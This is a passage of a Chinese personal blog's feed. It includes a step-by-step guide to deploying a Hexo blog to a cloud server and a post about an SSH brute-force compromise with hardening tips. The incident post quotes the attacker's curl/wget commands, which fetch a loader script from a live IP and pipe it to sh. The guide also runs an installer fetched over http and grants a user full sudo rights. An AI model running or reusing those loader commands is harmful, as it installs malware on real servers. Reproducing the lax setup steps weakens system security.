class="line">git config --global http.proxy http://127.0.0.1:1080</span><br><span class="line">git config --global https.proxy http://127.0.0.1:1080</span><br></pre></td></tr></table></figure><blockquote><p>tip：绝大部分情况下方法一就能决解决大部分克隆报错问题。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;git-clone-url-git-报10054错误，具体错误如下：&quot;&gt;&lt;a href=&quot;#git-clone-url-git-报10054错误，具体错误如下：&quot; class=&quot;headerlink&quot; title=&quot;git clone url.git 报10054</summary>
      
    
    
    
    
    <category term="记录" scheme="http://zhizhi111.github.io/tags/%E8%AE%B0%E5%BD%95/"/>
    
    <category term="Git" scheme="http://zhizhi111.github.io/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>如何将Hexo博客部署到云服务器</title>
    <link href="http://zhizhi111.github.io/2022/01/03/%E5%A6%82%E4%BD%95%E5%B0%86Hexo%E5%8D%9A%E5%AE%A2%E9%83%A8%E7%BD%B2%E5%88%B0%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>http://zhizhi111.github.io/2022/01/03/%E5%A6%82%E4%BD%95%E5%B0%86Hexo%E5%8D%9A%E5%AE%A2%E9%83%A8%E7%BD%B2%E5%88%B0%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/</id>
    <published>2022-01-03T13:55:28.000Z</published>
    <updated>2022-01-23T10:57:39.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><blockquote><p>此前我的博客都是部署在github上，但是github老是抽风，访问速度慢，当我拥有域名和服务器后，迫不及待的就要将个人博客项目部署到我的云服务器上，然后通过域名去访问，就大功告成，皆大欢喜啦。<br>但是在网上搜索了很多部署到服务器的教程，杂七杂八，有些很麻烦，有些通过ssh远程连接服务器敲linux命令，有些步骤还不详细，有些甚至跳步部署，确实是刚开始跟着那些教学踩了很多坑啊，部署好久，不是权限不够就是git完出现各种错误。<br>第一次部署问题太多，我解决不了，新建的文件夹还多，有点晕，就把服务器格式化了一次，着实头疼，浪费了太多的时间。<br>第二次是因为服务器被攻击，又格式化了一次，部署次数较多，嘿嘿，有经验。<br>所以当我部署成功后，第一时间就把我部署过程以及部署遇到的一些问题整理出来，记录下来，发一篇博客，帮助后面的同学部署少踩一点坑。此文章不断完善中。</p></blockquote><p>把我的部署成功过程分享出来给大家查看。</p><h3 id="注意：以下所有命令，一框多条命令，建议一行一行执行！！一行一行的复制到服务器运行。-大佬忽略"><a href="#注意：以下所有命令，一框多条命令，建议一行一行执行！！一行一行的复制到服务器运行。-大佬忽略" class="headerlink" title="注意：以下所有命令，一框多条命令，建议一行一行执行！！一行一行的复制到服务器运行。(大佬忽略)"></a>注意：以下所有命令，一框多条命令，建议一行一行执行！！一行一行的复制到服务器运行。(大佬忽略)</h3><h2 id="一、准备工作"><a href="#一、准备工作" class="headerlink" title="一、准备工作"></a>一、准备工作</h2><ol><li>已经备案的域名，已经解析绑定好服务器ip地址了，</li><li>一台云服务器，我这边使用的阿里云服务器，(TentOS 8系统)</li><li>在本地有基于hexo框架的博客项目<blockquote><p>基于其他框架的博客如果要部署到服务器此文章仅供参考，我没试过，步骤应该差不多哈。</p></blockquote></li><li>云主机环境搭建（Git，宝塔面板一键部署Nginx） 使用git自动化部署博客 。</li></ol><h2 id="二、修改本地Hexo博客的配置文件"><a href="#二、修改本地Hexo博客的配置文件" class="headerlink" title="二、修改本地Hexo博客的配置文件"></a>二、修改本地Hexo博客的配置文件</h2><ol><li>找到你本地项目的站点配置文件(不是主题配置文件)<br>打开D盘，blog文件夹，打开blog文件夹，打开_config.yml, 找到deploy，修改为以下内容<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line"><span class="built_in">type</span>:git</span><br><span class="line">repo: git@server:/var/repo/hexoBlog.git</span><br><span class="line">branch: master</span><br></pre></td></tr></table></figure><blockquote><p>#server改为你的服务器ip地址或者解析后的域名<br>#例如我改为  repo: <a href="mailto:&#x67;&#x69;&#x74;&#64;&#x73;&#107;&#x6b;&#121;&#97;&#x2e;&#x63;&#x6e;">&#x67;&#x69;&#x74;&#64;&#x73;&#107;&#x6b;&#121;&#97;&#x2e;&#x63;&#x6e;</a>:/var/repo/hexoBlog.git</p></blockquote></li></ol><h3 id="本地只需改这一个配置即可。原理就不赘叙了，大家部署过项目到GitHub上面都知道。"><a href="#本地只需改这一个配置即可。原理就不赘叙了，大家部署过项目到GitHub上面都知道。" class="headerlink" title="本地只需改这一个配置即可。原理就不赘叙了，大家部署过项目到GitHub上面都知道。"></a>本地只需改这一个配置即可。原理就不赘叙了，大家部署过项目到GitHub上面都知道。</h3><h2 id="三、开始部署服务器"><a href="#三、开始部署服务器" class="headerlink" title="三、开始部署服务器"></a>三、开始部署服务器</h2><h3 id="1-终端连接服务器，我使用的finalShell工具，比较方便"><a href="#1-终端连接服务器，我使用的finalShell工具，比较方便" class="headerlink" title="1. 终端连接服务器，我使用的finalShell工具，比较方便"></a>1. 终端连接服务器，我使用的<code>finalShell</code>工具，比较方便</h3><h3 id="2-安装宝塔面板来一键部署Nginx，命令如下："><a href="#2-安装宝塔面板来一键部署Nginx，命令如下：" class="headerlink" title="2. 安装宝塔面板来一键部署Nginx，命令如下："></a>2. 安装<a href="https://www.bt.cn/">宝塔面板</a>来一键部署Nginx，命令如下：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh</span><br></pre></td></tr></table></figure><h4 id="上面命令宝塔面板7-8-0的安装，安装过程会询问yorn-输入y即可（大约2分钟完成面板安装）。"><a href="#上面命令宝塔面板7-8-0的安装，安装过程会询问yorn-输入y即可（大约2分钟完成面板安装）。" class="headerlink" title="上面命令宝塔面板7.8.0的安装，安装过程会询问yorn,输入y即可（大约2分钟完成面板安装）。"></a>上面命令宝塔面板7.8.0的安装，安装过程会询问<code>y</code>or<code>n</code>,输入<code>y</code>即可（大约2分钟完成面板安装）。</h4><blockquote><p>提示：宝塔Linux面板7.8.0版本是基于Centos/Debian/Ubuntu开发的，为了最好的兼容性，请使用以上系统<br>系统兼容性顺序：<br>Centos7.x &gt; Debian10 &gt; Ubuntu 20.04 &gt; Cenots8.x &gt; Ubuntu 18.04 &gt; 其它系统<br>注意：Centos官方已宣布在2020年停止对Centos 6的维护更新，各大软件开发商也逐渐停止对Centos 6的兼容，新服务器不建议使用Centos 6。<br>我的8系统兼容性还是靠后的，所以很多教学都是推荐CentOS 7系统，我觉得问题不大，照样可以部署成功。</p></blockquote><h3 id="3-配置文件"><a href="#3-配置文件" class="headerlink" title="3.配置文件"></a>3.配置文件</h3><p>安装完成后我们顺便把配置文件也弄好，后期就不需要弄了。<br>安装完成后会显示面板后台地址·账号·密码。打开浏览器，访问面板外网登陆地址，选择Nginx的部署方案，静静等待部署。</p><h4 id="具体操作图如下："><a href="#具体操作图如下：" class="headerlink" title="具体操作图如下："></a>具体操作图如下：</h4><p><img src="https://s2.loli.net/2022/01/04/7rmPx8BtXU5EwGg.png" alt="2.png"></p><p><img src="https://s2.loli.net/2022/01/04/FHtZJdqe6oT8Wkv.png" alt="3.png"></p><p>等5分钟Nginx部署完成，点击网站-添加站点-输入域名(没有域名的输入自己服务器的IP地址)-底部的PHP版本选择”纯静态”(其他不改 或者根据自己的习惯来改)-提交。</p><p>网站创建完成后点击<code>设置</code> -配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">server</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">listen 80;</span><br><span class="line"></span><br><span class="line">\<span class="comment"># server_name 填写自己的域名(没有域名填写服务器ip地址也行)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">server_name skkya.cn;   <span class="comment">#没有域名填写服务器ip地址也行</span></span><br><span class="line">index index.php index.html index.htm default.php default.htm default.html;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\<span class="comment"># 这里root填写自己的网站根目录，修改为/var/www/hexo</span></span><br><span class="line"></span><br><span class="line">root /var/www/hexo;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="站点的设置中的配置文件只要修改这两个就可以保存"><a href="#站点的设置中的配置文件只要修改这两个就可以保存" class="headerlink" title="站点的设置中的配置文件只要修改这两个就可以保存"></a>站点的<code>设置</code>中的<code>配置文件</code>只要修改这两个就可以保存</h4><p>然后点击设置-网站目录， 网站目录默认的就行了，我看有的教程里改成/var文件夹，然后发现无法保存，这对我来说又是一个大坑。<br>运行目录为<code>/</code>应该也可以，我上一次部署是这个，现在我设置的运行目录为<code>/var/www/hexo</code>，保存即可。</p><h3 id="4-云服务器部署仓库"><a href="#4-云服务器部署仓库" class="headerlink" title="4.云服务器部署仓库"></a>4.云服务器部署仓库</h3><h4 id="以下步骤在finalShell终端敲命令"><a href="#以下步骤在finalShell终端敲命令" class="headerlink" title="以下步骤在finalShell终端敲命令"></a>以下步骤在finalShell终端敲命令</h4><ol><li>安装git<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install git   <span class="comment">#回车会提示y/n是否安装，输入y即可</span></span><br></pre></td></tr></table></figure></li><li>创建Git账户<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adduser git</span><br></pre></td></tr></table></figure></li><li>添加账户权限<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 740 /etc/sudoers</span><br><span class="line">vim /etc/sudoers</span><br></pre></td></tr></table></figure></li><li>找到<br>Allow root to run any commands anywhere<br>root ALL=(ALL) ALL<br>添加以下内容:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git ALL=(ALL) ALL</span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/01/04/tMlg9exoPV1wzOp.png" alt="4.png"></li></ol><p>保存退出(按 Esc 键退出编辑模式，输入”:wq” 保存退出)并改回权限:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 400 /etc/sudoers</span><br></pre></td></tr></table></figure><ol start="5"><li><p>设置git账户密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd git  <span class="comment">#输入此命令敲回车就可以输入密码，自己设置，别忘记，输入敲回车会再次输入确认密码</span></span><br></pre></td></tr></table></figure></li><li><p>切换至git用户，创建 ~/.ssh 文件夹和 ~/.ssh/authorized_keys 文件，并赋予相应的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su git</span><br><span class="line">mkdir ~/.ssh</span><br><span class="line">vim ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>然后将前面部署本地Hexo静态博客中生成的<code>SSH</code>秘钥，就是<code>id_rsa.pub</code>文件中的公钥复制到<code>authorized_keys</code>中,如果没有SSH秘钥请空降本文目录第五章<code>生成ssh公钥</code>。</p></li><li><p>在<code>本地</code>(不是服务器)Git终端中测试是否能免密登录git，其中下面SERVER为填写自己的云主机IP一定替换过来，执行输入yes后不用密码就说明好了（我这里没有免密成功但是不影响使用，你如果也没有可以放弃直接下一步步骤，反正我这边暂时找不到原因放弃了只是后期需要输入密码，不过还行也就1秒钟的事情，嫌麻烦的可以自己想办法解决一下）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -v git@SERVER   <span class="comment">#执行此命令需要我输入密码，不影响，不能免密也就手动输个密码的事</span></span><br></pre></td></tr></table></figure></li><li><p>创建目录</p></li></ol><h3 id="这边执行下面的命令没有权限，需要切回root用户，这是个大坑，我搞半天，离谱，在此加上："><a href="#这边执行下面的命令没有权限，需要切回root用户，这是个大坑，我搞半天，离谱，在此加上：" class="headerlink" title="这边执行下面的命令没有权限，需要切回root用户，这是个大坑，我搞半天，离谱，在此加上："></a>这边执行下面的命令没有权限，需要切回root用户，这是个大坑，我搞半天，离谱，在此加上：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root <span class="comment">#敲回车会让你输密码，就输你自己的设置的git密码，如果不对就输入服务器的密码，我密码设置都一样，没有排查用的是哪个。然后在执行下面的命令</span></span><br></pre></td></tr></table></figure><h3 id="1-repo作为为Git仓库目录"><a href="#1-repo作为为Git仓库目录" class="headerlink" title="1. repo作为为Git仓库目录"></a>1. repo作为为Git仓库目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir /var/repo</span><br><span class="line">chown -R git:git /var/repo</span><br><span class="line">chmod -R 755 /var/repo</span><br></pre></td></tr></table></figure><h3 id="2-hexo作为网站根目录"><a href="#2-hexo作为网站根目录" class="headerlink" title="2. hexo作为网站根目录"></a>2. hexo作为网站根目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir /var/www</span><br><span class="line">mkdir /var/www/hexo</span><br><span class="line">chown -R git:git /var/www/hexo</span><br><span class="line">chmod -R 755 /var/www/hexo</span><br></pre></td></tr></table></figure><p>然后创建一个裸的 Git 仓库,返回root目录创建。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br><span class="line"><span class="built_in">cd</span> /var/repo</span><br><span class="line">git init --bare hexoBlog.git</span><br></pre></td></tr></table></figure><p>创建一个新的 Git 钩子，用于自动部署 在 /var/repo/hexoBlog.git 下，有一个自动生成的 <code>hooks </code>文件夹。我们需要在里边新建一个新的钩子文件 <code>post-receive</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /var/repo/hexoBlog.git/hooks/post-receive</span><br></pre></td></tr></table></figure><p>按 i 键进入文件的编辑模式，在该文件中添加两行代码（将下边的代码粘贴进去)，指定 Git 的工作树（源代码）和 Git 目录（配置文件等）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/bin/bash</span></span><br><span class="line"></span><br><span class="line">git --work-tree=/var/www/hexo --git-dir=/var/repo/hexoBlog.git checkout -f</span><br></pre></td></tr></table></figure><p>然后，按 Esc 键退出编辑模式，输入”:wq” 保存退出。</p><p>修改文件权限，使得其可执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chown -R git:git /var/repo/hexoBlog.git/hooks/post-receive</span><br><span class="line">chmod +x /var/repo/hexoBlog.git/hooks/post-receive</span><br></pre></td></tr></table></figure><h3 id="到这里，我们的-Git-仓库算是完全搭建好了"><a href="#到这里，我们的-Git-仓库算是完全搭建好了" class="headerlink" title="到这里，我们的 Git 仓库算是完全搭建好了"></a>到这里，我们的 Git 仓库算是完全搭建好了</h3><p>重启宝塔面板服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service bt restart</span><br></pre></td></tr></table></figure><p>不出错显绿说明完成，如图：<br><img src="https://s2.loli.net/2022/01/04/D2ZrfNWbBqlhFJ7.png" alt="5.png"></p><p>然后到你的本地博客项目根目录下<code>git bash</code>打开git面板，输入以下命令试试能够部署成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g -d</span><br></pre></td></tr></table></figure><p>期间可能要输入密码，可能是免密登录，我hexo d是需要密码才能上传的，这个影响不大<br>打开浏览器输入你的域名或ip地址就可以看到你部署的Hexo博客了。至此，我们已经成功完成，并且访问自己的服务器端比访问github快多了.</p><h2 id="四、常见问题"><a href="#四、常见问题" class="headerlink" title="四、常见问题"></a>四、常见问题</h2><h3 id="1-git权限不够"><a href="#1-git权限不够" class="headerlink" title="1. git权限不够"></a>1. git权限不够</h3><p>我在部署过程中，执行<code>hexo d</code>发现部署老是出错，什么权限不允许之类的，这里我们需要检查我们在上述的git操作部署是否使用了git用户操作，若是没有，需要给相应的目录更改用户组使用.<br>比如：<br><img src="https://gitee.com/mingkaikai/tuku/raw/master/640.webp.jpg#vwid=646&vhei=367" alt="1"></p><p>我们需要给权限，在服务器输入以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R git:git /var/repo/</span><br></pre></td></tr></table></figure><p>这条命令递归的将repo目录及其子目录用户组设置为git。同时使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R git:git /var/www/hexo</span><br></pre></td></tr></table></figure><p>然后在去上传到服务器<code>hexo d</code>试试吧。我给玩权限就成功啦！！！</p><h3 id="2-var-www-hexo不允许被设置成网站目录"><a href="#2-var-www-hexo不允许被设置成网站目录" class="headerlink" title="2. /var/www/hexo不允许被设置成网站目录"></a>2. /var/www/hexo不允许被设置成网站目录</h3><p>我也无法将站点网站修改为/var目录，但是本地通过<code>hexo d</code>是上传到/var目录，经过我的测试，，都改成了root /var/www/hexo，这个是对的</p><h3 id="3-宝塔面板外网地址无法访问"><a href="#3-宝塔面板外网地址无法访问" class="headerlink" title="3. 宝塔面板外网地址无法访问"></a>3. 宝塔面板外网地址无法访问</h3><p>宝塔面板默认使用服务器8888端口，服务器这个端口没开，去你的服务器控制台，添加安全组，开启8888放行端口即可。点击服务器-安全组-服务器-入方向-手动添加安全组-添加8888端口(端口范围8888，授权对象为0.0.0.0/0),还是不会的建议自行百度哈，不难。控制台也有文档教学的。</p><h3 id="4-SSH服务端口-默认端口为22-改了，之后再deploy报错"><a href="#4-SSH服务端口-默认端口为22-改了，之后再deploy报错" class="headerlink" title="4.SSH服务端口(默认端口为22)改了，之后再deploy报错"></a>4.SSH服务端口(默认端口为22)改了，之后再deploy报错</h3><p>为了安全，我修改了<code>SSH</code>默认连接端口，在宝塔面板安全里面修改的，项目更新了，想再次上传，发现一直报错，刚开始以为需要重新给权限，最后发现是端口的问题，输入以下命令发现是端口的问题：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -v git@SERVER   <span class="comment">#server改成自己的服务器ip地址</span></span><br></pre></td></tr></table></figure><p>报错如下：<br><img src="https://s2.loli.net/2022/01/08/72J6bX5DNOfuhAv.png" alt="6.png"></p><blockquote><p>解决方法：</p></blockquote><ol><li>将SSH连接端口重新改回默认端口。(暂时没找到其他解决方法，实在不行咱就不改端口吧)</li><li>将默认端口改完以后再部署git权限(下次部署试试)。</li></ol><h2 id="五、生成ssh-公钥"><a href="#五、生成ssh-公钥" class="headerlink" title="五、生成ssh 公钥"></a>五、生成ssh 公钥</h2><p>在桌面右击，点击Git Bash Here打开命令行终端，执行如下命令（直接按三次回车生成密钥）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>这时命令就会在电脑本地新建一个文件夹，文件夹默认在C盘下面的users/administrator/.ssh文件<br>打开<code>ssh</code>文件，会看到两个文件，分别是 <code>id_rsa</code> 和 <code>id_rsa.pud</code>  两个文件<br>点开 <code>id_rsa.pud</code> 文件，复制出秘钥即可。</p><h2 id="六、致谢"><a href="#六、致谢" class="headerlink" title="六、致谢"></a>六、致谢</h2><p>至此，搭建的过程就结束了…<br>感谢<a href="https://quefeixi.com/archives/18.html">铭kk个人博客</a>的部署教学！本文是基于这篇文章完善的，第一次部署也是基于这篇博客成功的，期间也踩了不少坑，浪费的时间挺多，头发也掉不少哈。我给它完善了一下，还有两行命令没啥用来着，我没执行。以上内容就是根据我成功部署来写得步骤，一步一步来没有什么大毛病。如果遇到什么问题，欢迎在下方评论，一起解决。</p><h3 id="本文首次发布于2022年1月4号，转载请说明出处并附上本站地址！感谢。"><a href="#本文首次发布于2022年1月4号，转载请说明出处并附上本站地址！感谢。" class="headerlink" title="本文首次发布于2022年1月4号，转载请说明出处并附上本站地址！感谢。"></a>本文首次发布于2022年1月4号，转载请说明出处并附上本站地址！感谢。</h3><h3 id="最后，感谢阅读"><a href="#最后，感谢阅读" class="headerlink" title="最后，感谢阅读"></a>最后，感谢阅读</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;此前我的博客都是部署在github上，但是github老是抽风，访问速度慢，当我拥有域名和服务器后，迫不及</summary>
      
    
    
    
    
    <category term="教学" scheme="http://zhizhi111.github.io/tags/%E6%95%99%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>我的服务器被暴力破解</title>
    <link href="http://zhizhi111.github.io/2022/01/03/%E9%98%BF%E9%87%8C%E4%BA%91ECS%E8%A2%AB%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    <id>http://zhizhi111.github.io/2022/01/03/%E9%98%BF%E9%87%8C%E4%BA%91ECS%E8%A2%AB%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</id>
    <published>2022-01-03T12:30:21.000Z</published>
    <updated>2022-01-23T10:57:39.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>新手刚接触ECS云服务器还不懂需要做些什么，只能见招拆招了。今天服务器遭受SSH暴力破解，所以整理一些东西让遇到这些问题的人可以减少这个烦恼，废话不多说进入正题。<br>起因：<br>手机收到阿里云提示短信，检测到ECS服务器出现紧急安全事件：访问恶意下载源</p></blockquote><h2 id="一、具体事件"><a href="#一、具体事件" class="headerlink" title="一、具体事件"></a>一、具体事件</h2><p>服务器被恶意攻击，是人性的泯灭还是道德的沦丧，咱就是说才买几天的服务器，就挂了个人博客的项目，不至于吧，不至于吧！HXD？！！服务器格式化了，项目得重新部署了…..fffffffffffff<br>自己的阿里云服务器被别有用心的人gank一波，服务器被暴力破解密码并且异地登录，然后我就收到了阿里云发的服务器异地登录短信，打开手机查看阿里云，好家伙，五个安全警告，有三个是恶意脚本代码执行的警告，分别执行了<code>curl</code>，<code>bash</code>以及<code>wget</code>命令，具体命令行代码分别如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -k --user-agent e842c5c9_root:Root1234 http://194.145.227.21/ldr.sh</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -c (curl -k --user-agent e842c5c9_root:Root1234 http://194.145.227.21/ldr.sh||wget --no-check-certificate --user-agent e842c5c9_root:Root1234 </span><br><span class="line">-q -O- http://194.145.227.21/ldr.sh)|sh</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --no-check-certificate --user-agent e842c5c9_root:Root1234 -q -O- http://194.145.227.21/ldr.sh</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/01/03/WpvSRzAY3LPuKQo.png" alt="6.png"></p><h3 id="执行恶意脚本文件其中一项警告的截图如下："><a href="#执行恶意脚本文件其中一项警告的截图如下：" class="headerlink" title="执行恶意脚本文件其中一项警告的截图如下："></a>执行恶意脚本文件其中一项警告的截图如下：</h3><p><img src="https://s2.loli.net/2022/01/03/jESVpurQkszeCGJ.png" alt="7.png"></p><p>尝试访问这个网站，<code>http://194.145.227.21/ldr.sh||wget</code>，提示木马风险，没敢继续访问。</p><h2 id="二、如何预防"><a href="#二、如何预防" class="headerlink" title="二、如何预防"></a>二、如何预防</h2><h3 id="1-什么是SSH暴力破解攻击？"><a href="#1-什么是SSH暴力破解攻击？" class="headerlink" title="1. 什么是SSH暴力破解攻击？"></a>1. 什么是SSH暴力破解攻击？</h3><p>SSH暴力破解是指攻击者通过密码字典或随机组合密码的方式尝试登陆服务器（针对的是全网机器），这种攻击行为一般不会有明确攻击目标，多数是通过扫描软件直接扫描整个广播域或网段；</p><h3 id="2-怎样预防被暴力破解攻击？"><a href="#2-怎样预防被暴力破解攻击？" class="headerlink" title="2. 怎样预防被暴力破解攻击？"></a>2. 怎样预防被暴力破解攻击？</h3><pre><code>(1)定期检查并修复系统漏洞 (2)定期修改SSH密码，或配置证书登陆 (3)修改SSH端口 (4)禁Ping(5)若你长期不需要登陆SSH，请在面板中将SSH服务关闭 (6)安装云锁、安全狗等安全软件</code></pre><blockquote><p>被入侵后的安全优化建议：</p></blockquote><ol><li>推荐使用 SSH 密钥进行登录，减少暴力破解的风险。登录服务器控制台，然后创建密钥对，然后下载私钥到本地；然后与实例进行绑定，当然也可以在这边进行解绑，删除（注意一定是在关机的情况下才能进行）<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#进入服务器-网络与安全-密钥对-创建密钥对，创建成功后记得绑定实例，并下载给的密钥做好备份，这个只能下载一次！</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#我用的是finalShell，在新建连接的时候，用户身份验证栏的方法选择Public Key，用户密钥点击浏览，选择刚刚下载的密钥导入即可</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#如果ECS实例原先使用密码认证，绑定密钥对后，密码验证方式自动失效。</span></span><br><span class="line"><span class="comment">#也可以手动禁用，登录成功后修改配置文件，禁用密码登录验证方式</span></span><br><span class="line">$ vim /etc/ssh/sshd_config</span><br><span class="line"><span class="comment">#添加：PasswordAuthentication no  </span></span><br></pre></td></tr></table></figure></li><li>在服务器内编辑/etc/ssh/sshd_config文件中的 Port 22，将 22 修改为其他非默认端口，修改之后重启 SSH 服务。可使用如下命令重启：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/sshd restart（CentOS）或 /etc/init.d/ssh restart（Debian/Ubuntu）</span><br><span class="line"><span class="comment">##也可以使用宝塔面板该端口，安全-SSH端口，修改为你想要的端口，修改完去控制台放行端口即可。</span></span><br></pre></td></tr></table></figure></li><li>无论应用程序管理后台（网站、中间件、tomcat 等）、远程 SSH、远程桌面、数据库，都建议设置复杂且不一样的密码。</li><li>删除异常账号<br>检查：使用last命令查看下服务器近期登录的帐户记录，确认是否有可疑 IP 登录过机器。<br>解决：检查发现有可疑用户时，可使用命令usermod -L 用户名禁用用户或者使用命令userdel -r 用户名删除用户。</li></ol><h2 id="三、CentOS7系统的云服务器如果设置防火墙"><a href="#三、CentOS7系统的云服务器如果设置防火墙" class="headerlink" title="三、CentOS7系统的云服务器如果设置防火墙"></a>三、CentOS7系统的云服务器如果设置防火墙</h2><p>我使用的是CentOS 8系统，7的配置请参考阿里云官方文档：<a href="https://help.aliyun.com/knowledge_detail/41317.html">点这里</a></p><h2 id="四、CentOS-8开启防火墙"><a href="#四、CentOS-8开启防火墙" class="headerlink" title="四、CentOS 8开启防火墙"></a>四、CentOS 8开启防火墙</h2><p>防火墙在CentOS8是默认安装的，所以安装跳过。</p><h3 id="1-防火墙状态查看"><a href="#1-防火墙状态查看" class="headerlink" title="1. 防火墙状态查看"></a>1. 防火墙状态查看</h3><p> 阿里云默认防火墙是关闭的，可以通过两个命令查看当前防火墙状态：<br> (1)防火墙:<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --state</span><br></pre></td></tr></table></figure><br> (2)系统服务管理命令:<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status firewalld</span><br></pre></td></tr></table></figure></p><h3 id="2-开启防火墙"><a href="#2-开启防火墙" class="headerlink" title="2. 开启防火墙"></a>2. 开启防火墙</h3><p>我这里就从开启防火墙开始：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start 